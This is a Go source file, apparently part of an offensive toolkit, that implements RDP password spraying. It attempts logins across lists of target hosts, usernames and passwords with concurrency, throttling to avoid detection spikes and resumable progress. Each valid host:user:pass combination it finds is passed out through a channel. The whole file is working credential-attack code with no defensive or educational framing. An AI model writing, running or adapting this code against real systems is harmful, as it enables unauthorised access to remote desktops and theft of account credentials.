// rdpspray.go - Updated with connection monitoring and proper cleanup

package main

import (
	"fmt"
	"sync"
	"time"
	"sync/atomic"

	"github.com/whiterabb17/strongarm/grdp"
	"github.com/whiterabb17/strongarm/grdp/glog"
)

func safe(funcToRun func()) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Println("Recovered from panic:", r)
		}
	}()
	funcToRun()
}

func rdpSpray(wg *sync.WaitGroup, channelToCommunicate chan string, taskToRun task, storeResult *int32) {
	defer wg.Done()
	
	internalCounter := int32(0)
	
	// Pre-parse all targets once
	targetCache := make(map[string]targetStruct, len(taskToRun.targetsRaw))
	for _, taskTarget := range taskToRun.targetsRaw {
		if _, exists := targetCache[taskTarget]; !exists {
			temporaryTarget := parseTarget(taskTarget)
			if temporaryTarget.port == 0 {
				temporaryTarget.port = 3389
			}
			targetCache[taskTarget] = temporaryTarget
		}
	}
	
	// Batch progress saves
	progressSaveCounter := int32(0)
	const progressSaveBatch = int32(100)
	
	semaphore := make(chan struct{}, CONCURRENT_PER_WORKER)
	var workerWg sync.WaitGroup
	
	for _, taskTarget := range taskToRun.targetsRaw {
		temporaryTarget := targetCache[taskTarget]
		taskToRun.target = temporaryTarget
		targetString := stringifyTarget(taskToRun.target)

		// Early exit flag per target
		foundValidCombo := int32(0)
		
		for _, password := range taskToRun.passwords {
			if atomic.LoadInt32(&foundValidCombo) == 1 {
				break
			}
			
			for _, username := range taskToRun.usernames {
				if atomic.LoadInt32(&foundValidCombo) == 1 {
					break
				}
				
				// Skip already processed attempts
				currentProgress := atomic.LoadInt32(storeResult)
				if internalCounter < currentProgress {
					internalCounter++
					continue
				}

				// CHECK IF WE SHOULD THROTTLE
				if globalMonitor.ShouldThrottle() {
					throttleDelay := globalMonitor.GetThrottleDelay()
					if throttleDelay > 0 {
						fmt.Printf("⚠️  Throttling: %d active connections, waiting %v\n", 
							globalMonitor.GetActiveCount(), throttleDelay)
						time.Sleep(throttleDelay)
					}
				}

				// Acquire semaphore for concurrent control
				workerWg.Add(1)
				semaphore <- struct{}{}
				
				go func(user, pass, target string, counter int32) {
					defer workerWg.Done()
					defer func() { <-semaphore }()
					
					// TRACK CONNECTION START
					globalMonitor.IncrementActive()
					defer globalMonitor.DecrementActive() // ALWAYS decrement when done
					
					// Create client for each attempt
					client := grdp.NewClient(target, glog.NONE)
					defer client.Close() // ENSURE CLEANUP - this is critical!
					
					safe(func() {
						err := client.LoginForSSL(".", user, pass)
						if err != nil {
							atomic.AddInt64(&stats.errors, 1)
							globalMonitor.RecordFailure()
						} else {
							// Mark as found to stop other goroutines
							atomic.StoreInt32(&foundValidCombo, 1)
							globalMonitor.RecordSuccess()
							
							select {
							case channelToCommunicate <- taskToRun.target.host + ":" + user + ":" + pass:
							default:
								fmt.Print("!")
							}
							time.Sleep(100 * time.Millisecond)
						}
					})
					
					// Always increment counters after each attempt
					atomic.AddInt32(storeResult, 1)
					
					// Batch progress saves (async to prevent blocking)
					if atomic.AddInt32(&progressSaveCounter, 1) >= progressSaveBatch {
						go saveProgress() // ASYNC save to prevent blocking
						atomic.StoreInt32(&progressSaveCounter, 0)
					}
				}(username, password, targetString, internalCounter)
				
				internalCounter++
				
				// ADD SMALL DELAY between spawning goroutines to prevent spikes
				time.Sleep(5 * time.Millisecond)
			}
		}
	}
	
	// Wait for all concurrent tasks to complete
	workerWg.Wait()
	
	// Final progress save if needed
	if progressSaveCounter > 0 {
		saveProgress()
	}
}
